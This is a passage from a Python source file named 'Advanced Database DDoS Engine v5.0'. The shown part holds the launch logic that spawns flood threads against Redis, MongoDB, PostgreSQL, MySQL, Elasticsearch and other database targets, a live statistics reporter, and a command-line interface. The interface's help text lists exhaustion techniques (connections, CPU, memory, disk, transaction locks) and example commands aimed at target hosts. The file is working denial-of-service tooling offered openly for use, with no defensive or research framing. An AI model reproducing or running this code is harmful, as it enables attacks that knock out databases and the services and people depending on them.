        for sock in connections:
            try:
                sock.close()
            except:
                pass
    
    def _stats_reporter(self):
        while self.running:
            stats = self.stats.get_summary()
            
            db_breakdown = " | ".join([f"{k}:{v}" for k, v in stats['db_type_stats'].items()])
            
            sys.stdout.write(
                f"\r[+] {datetime.now().strftime('%H:%M:%S')} | "
                f"Time: {stats['elapsed']:.0f}s | "
                f"Ops: {stats['total_operations']} | "
                f"Rate: {stats['rate']:.0f}/s | "
                f"Success: {stats['successful']} | "
                f"Failed: {stats['failed']} | "
                f"Connections: {stats['active_connections']} | "
                f"Avg RT: {stats['avg_response_time']*1000:.1f}ms | "
                f"[{db_breakdown}]   "
            )
            sys.stdout.flush()
            time.sleep(0.5)
    
    def launch(self):
        if not self._test_target():
            logger.error("[-] Attack aborted - target unreachable")
            return
        
        logger.info(f"[!] Starting {self.db_type.value} database attack")
        logger.info(f"[!] Target: {self.target}:{self.port} | Threads: {self.threads} | Duration: {self.duration}s")
        
        reporter = threading.Thread(target=self._stats_reporter, daemon=True)
        reporter.start()
        
        # Map database type to worker
        workers = {
            DatabaseType.REDIS: self._redis_flood_worker,
            DatabaseType.MONGODB: self._mongodb_flood_worker,
            DatabaseType.ELASTICSEARCH: self._elasticsearch_flood_worker,
            DatabaseType.POSTGRESQL: self._postgresql_flood_worker,
            DatabaseType.MYSQL: self._mysql_flood_worker,
            DatabaseType.CASSANDRA: self._cassandra_flood_worker,
            DatabaseType.COUCHDB: self._elasticsearch_flood_worker,  # Similar HTTP API
            DatabaseType.INFLUXDB: self._elasticsearch_flood_worker,  # Similar HTTP API
            DatabaseType.NEO4J: self._elasticsearch_flood_worker,      # Similar HTTP API
        }
        
        worker_func = workers.get(self.db_type, self._connection_flood_worker)
        
        # Launch attack threads
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=worker_func, args=(i,), daemon=True)
            t.start()
            threads.append(t)
        
        # Also launch dedicated connection flood threads
        for i in range(self.threads // 4):
            t = threading.Thread(target=self._connection_flood_worker, args=(i + 100000,), daemon=True)
            t.start()
            threads.append(t)
        
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            logger.info("\n[!] Interrupted by user")
        finally:
            self.running = False
        
        for t in threads:
            t.join(timeout=2)
        
        self.connection_pool.close_all()
        
        stats = self.stats.get_summary()
        logger.info("\n[!] Database Attack Complete")
        logger.info(f"    Duration: {stats['elapsed']:.2f}s")
        logger.info(f"    Total Operations: {stats['total_operations']}")
        logger.info(f"    Successful: {stats['successful']}")
        logger.info(f"    Failed: {stats['failed']}")
        logger.info(f"    Average Rate: {stats['rate']:.0f} ops/s")
        logger.info(f"    Avg Response Time: {stats['avg_response_time']*1000:.1f}ms")
        logger.info(f"    Max Connections: {stats['active_connections']}")
        logger.info(f"    DB Stats: {stats['db_type_stats']}")
        logger.info(f"    Attack Methods: {stats['attack_method_stats']}")

# ==================== MAIN CONTROLLER ====================
def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Advanced Database DDoS Engine v5.0",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Database Targets:
  redis          - Redis (port 6379)
  mongodb        - MongoDB (port 27017)
  elasticsearch  - Elasticsearch (port 9200)
  postgresql     - PostgreSQL (port 5432)
  mysql          - MySQL (port 3306)
  cassandra      - Cassandra (port 9042)
  couchdb        - CouchDB (port 5984)
  influxdb       - InfluxDB (port 8086)
  neo4j          - Neo4j (port 7474)
  mixed          - Random combination of all databases

Attack Methods Auto-Applied:
  - Connection pool exhaustion (open thousands of connections)
  - CPU exhaustion (complex queries, recursive CTEs, regex)
  - Memory exhaustion (large payloads, batch operations)
  - Disk exhaustion (forced writes, index creation)
  - Query flood (rapid fire queries)
  - Cursor exhaustion (large result sets)
  - Transaction locks (long-running transactions)

Examples:
  python3 db_ddos.py redis.example.com -p 6379 --db redis -t 1000 -d 120
  python3 db_ddos.py mongo.target.com -p 27017 --db mongodb -t 500
  python3 db_ddos.py es.internal -p 9200 --db elasticsearch -t 800
  python3 db_ddos.py 10.0.0.50 -p 5432 --db postgresql -t 300
  python3 db_ddos.py db.target.com --db mixed -t 2000 -d 300
        """
    )
    
    parser.add_argument('target', help='Target hostname or IP')
    parser.add_argument('-p', '--port', type=int, help='Target port (auto-detected if not specified)')
    parser.add_argument('-t', '--threads', type=int, default=500, help='Number of threads (default: 500)')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Duration in seconds (default: 60)')
    parser.add_argument('--db', default='redis', help='Database type (default: redis)')
    parser.add_argument('--redis-pass', help='Redis password for authenticated instances')
    parser.add_argument('--mysql-user', default='root', help='MySQL username')
    parser.add_argument('--mysql-pass', help='MySQL password')
    parser.add_argument('--pg-user', default='postgres', help='PostgreSQL username')
    parser.add_argument('--pg-pass', help='PostgreSQL password')
    parser.add_argument('--debug', action='store_true', help='Enable debug logging')
    
    args = parser.parse_args()
    
    if args.debug:
        config.debug = True
        logger.setLevel(logging.DEBUG)
    
    if args.redis_pass:
        config.redis_auth_password = args.redis_pass
    if args.mysql_user:
        config.mysql_user = args.mysql_user
    if args.mysql_pass:
        config.mysql_password = args.mysql_pass
    if args.pg_user:
        config.postgres_user = args.pg_user
    if args.pg_pass:
        config.postgres_password = args.pg_pass
    
    # Resolve target
    try:
        ipaddress.ip_address(args.target)
        target = args.target
    except ValueError:
        try:
            target = socket.gethostbyname(args.target)
            logger.info(f"[+] Resolved {args.target} to {target}")
        except socket.gaierror:
            logger.error(f"[-] Cannot resolve: {args.target}")
            sys.exit(1)
    
    # Parse database type
    db_map = {db.value: db for db in DatabaseType}
    db_type = db_map.get(args.db.lower())
    
    if not db_type:
        logger.error(f"[-] Unknown database: {args.db}")
        logger.info(f"Available: {', '.join(db_map.keys())}")
        sys.exit(1)
    
    # Auto-detect port if not specified
    if not args.port:
        default_ports = {
            DatabaseType.REDIS: 6379,
            DatabaseType.MONGODB: 27017,
            DatabaseType.ELASTICSEARCH: 9200,
            DatabaseType.POSTGRESQL: 5432,
            DatabaseType.MYSQL: 3306,
            DatabaseType.CASSANDRA: 9042,
            DatabaseType.COUCHDB: 5984,
            DatabaseType.INFLUXDB: 8086,
            DatabaseType.NEO4J: 7474,
        }
        port = default_ports.get(db_type, 80)
        logger.info(f"[+] Auto-detected port: {port}")
    else:
        port = args.port
    
    if db_type == DatabaseType.MIXED:
        # Launch multiple database attacks simultaneously
        databases = [
            DatabaseType.REDIS,
            DatabaseType.MONGODB,
            DatabaseType.ELASTICSEARCH,
            DatabaseType.POSTGRESQL,
            DatabaseType.MYSQL,
        ]
        
        threads_per_db = max(1, args.threads // len(databases))
        executors = []
        
        for db in databases:
            db_port = {
                DatabaseType.REDIS: 6379,
                DatabaseType.MONGODB: 27017,
                DatabaseType.ELASTICSEARCH: 9200,
                DatabaseType.POSTGRESQL: 5432,
                DatabaseType.MYSQL: 3306,
            }.get(db, port)
            
            executor = DatabaseAttackExecutor(target, db_port, db, threads_per_db, args.duration)
            thread = threading.Thread(target=executor.launch, daemon=True)
            thread.start()
            executors.append((executor, thread))
        
        try:
            time.sleep(args.duration)
        except KeyboardInterrupt:
            logger.info("\n[!] Interrupted")
        
        for executor, _ in executors:
            executor.running = False
        
        logger.info("[!] Mixed database attack completed")
    else:
        executor = DatabaseAttackExecutor(target, port, db_type, args.threads, args.duration)
        executor.launch()

if __name__ == "__main__":
    main()